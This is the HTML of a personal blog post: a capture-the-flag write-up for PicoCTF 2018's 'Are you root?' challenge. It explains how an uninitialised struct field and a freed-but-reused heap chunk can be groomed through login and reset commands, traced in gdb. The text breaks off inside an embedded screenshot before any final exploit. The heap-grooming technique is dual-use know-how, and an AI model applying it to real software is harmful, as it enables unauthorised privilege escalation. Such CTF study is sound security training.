<!doctype html>
<html lang="en" dir="ltr" class="blog-wrapper blog-post-page plugin-blog plugin-id-default">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="Docusaurus v2.0.0-beta.18">
<link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="My Site RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="My Site Atom Feed"><title data-rh="true">Are you root? | My Site</title><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://christopher-nguyen-re.github.io/blog/are-you-root"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docusaurus_tag" content="default"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docsearch:docusaurus_tag" content="default"><meta data-rh="true" property="og:title" content="Are you root? | My Site"><meta data-rh="true" name="description" content="2018 PicoCTF: Are you root?"><meta data-rh="true" property="og:description" content="2018 PicoCTF: Are you root?"><meta data-rh="true" property="og:type" content="article"><meta data-rh="true" property="article:published_time" content="2022-03-01T00:00:00.000Z"><meta data-rh="true" property="article:author" content="https://github.com/christopher-nguyen-re"><meta data-rh="true" property="article:tag" content="PicoCTF 2018,Binary Exploitation,Heap grooming"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://christopher-nguyen-re.github.io/blog/are-you-root"><link data-rh="true" rel="alternate" href="https://christopher-nguyen-re.github.io/blog/are-you-root" hreflang="en"><link data-rh="true" rel="alternate" href="https://christopher-nguyen-re.github.io/blog/are-you-root" hreflang="x-default"><link rel="stylesheet" href="/assets/css/styles.b9335062.css">
<link rel="preload" href="/assets/js/runtime~main.adf85c56.js" as="script">
<link rel="preload" href="/assets/js/main.9d7ce086.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div role="region"><a href="#" class="skipToContent_ZgBM">Skip to main content</a></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="My Site Logo" class="themedImage_W2Cr themedImage--light_TfLj"><img src="/img/logo.svg" alt="My Site Logo" class="themedImage_W2Cr themedImage--dark_oUvU"></div><b class="navbar__title">My Site</b></a><a class="navbar__item navbar__link" href="/docs/intro">Tutorial</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/blog">Blog</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/facebook/docusaurus" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_S7eR colorModeToggle_vKtC"><button class="clean-btn toggleButton_rCf9 toggleButtonDisabled_Pu9x" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_v35p"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_nQuB"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper"><div class="container margin-vert--lg"><div class="row"><aside class="col col--3"><nav class="sidebar_a9qW thin-scrollbar" aria-label="Blog recent posts navigation"><div class="sidebarItemTitle_uKok margin-bottom--md">Recent posts</div><ul class="sidebarItemList_Kvuv"><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/blog/heres_a_libc">Here&#x27;s a LIBC</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/blog/guessing_game_1">Guessing Game 1</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/blog/function_overwrite">Function Overwrite</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/blog/got_hax">Got Hax</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/blog/level-1">Level 1</a></li></ul></nav></aside><main class="col col--7" itemscope="" itemtype="http://schema.org/Blog"><article itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><header><h1 class="blogPostTitle_rzP5" itemprop="headline">Are you root?</h1><div class="blogPostData_Zg1s margin-vert--md"><time datetime="2022-03-01T00:00:00.000Z" itemprop="datePublished">March 1, 2022</time> · <!-- -->4 min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_FlmR"><div class="avatar margin-bottom--sm"><span class="avatar__photo-link avatar__photo"><a href="https://github.com/christopher-nguyen-re" target="_blank" rel="noopener noreferrer"><img class="image_o0gy" src="https://cdn.cnn.com/cnnnext/dam/assets/190517103414-01-grumpy-cat-file-restricted.jpg" alt="Christopher Nguyen"></a></span><div class="avatar__intro" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><div class="avatar__name"><a href="https://github.com/christopher-nguyen-re" target="_blank" rel="noopener noreferrer" itemprop="url"><span itemprop="name">Christopher Nguyen</span></a></div><small class="avatar__subtitle" itemprop="description">Reverse Engineer</small></div></div></div></div></header><div id="post-content" class="markdown" itemprop="articleBody"><p>2018 PicoCTF: Are you root?</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="the-challenge">The Challenge<a class="hash-link" href="#the-challenge" title="Direct link to heading">​</a></h2><p>The provided executable <a href="/files/are_you_root/auth">here</a></p><p>The goal is to obtain the flag.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="analysis">Analysis<a class="hash-link" href="#analysis" title="Direct link to heading">​</a></h2><p>Running the program on a terminal gives us an interface we can login as a user. We are given the option to set the authorization level below 5. In order to get the flag, we must be able to set the authorization to level 5.</p><p>After looking through the source file, we can see that allocated memory is not initalized for the <code>user</code> struct member <code>level</code>. <code>user-&gt;name</code> is free&#x27;d upon receiving the <code>reset</code> command but the <code>user</code> struct itself is not freed.</p><p>We can use gdb with the gef extension to look more closely into the heap memory as we run the program. I have a breakpoint set at <code>putchar</code> as it is right before <code>fgets</code> is called for user input. I run <code>heap chunks</code> and <code>heap bins</code> to look at the current status of the heap.</p><p><img loading="lazy" alt="Initial heap and bin" src="/assets/images/initial_heap-11232ec222d57333b1d6d72d7df1fc7b.png" width="756" height="383" class="img_E7b_"></p><p>As expected, there is no memory allocated on the heap or stored in bins yet.</p><p>I enter <code>login aaaaaaaaaaaaaaaaaaaa</code> to login as a user named containg 20 &#x27;A&#x27;s and look at <code>heap chunks</code> and <code>heap bins</code>.</p><p><img loading="lazy" alt="Heap and bin after first login" src="/assets/images/login_heap-c0499ca9ce7bd9cf1b5a09c4cfc06701.png" width="875" height="531" class="img_E7b_"></p><p>Viewing the chunks shows the stdin buffer containing the input string. Under it is a chunk that contains a pointer to the chunk below it. This makes me think that it is the user struct containing the pointer to the user name. The chunk with user name contains the &#x27;a&#x27;s as expected.</p><p>I enter <code>reset</code> to free user name and look at the updated <code>heap chunks</code> and <code>heap bins</code>.</p><p><img loading="lazy" alt="Heap and bin after reset" src="/assets/images/reset-f0608a2f1731574c00c2e87d58f3275f.png" width="900" height="532" class="img_E7b_"></p><p>When free is called on <code>user-&gt;name</code>, the chunk containing the name string is stored in tcache.</p><p>If we log in again and look at the heap chunks, we can see that the free&#x27;d memory still contains a part of the username provided previously. The first 8 bytes are zero&#x27;d out but the rest remain the same. I enter <code>login b</code> and view the updated heap and bins.</p><p><img loading="lazy" alt="Logging in after reset" src="/assets/images/second_login-2a56509d23c9f64935928c5b951fadac.png" width="931" height="567" class="img_E7b_"></p><p>The chunk at 0x603260 is the stdin buffer as it contains <code>reset</code> and &#x27;a&#x27;s. The &#x27;a&#x27;s are still there because stdin is not flushed and a null terminator separates the strings. The user struct is still in the chunks since it was not freed. Tcache is now empty because the chunk is being reused by the new user struct.</p><p>Entering <code>show</code> then gives us the output below:</p><p><img loading="lazy" alt="show on second login" src="data:image/png;base64,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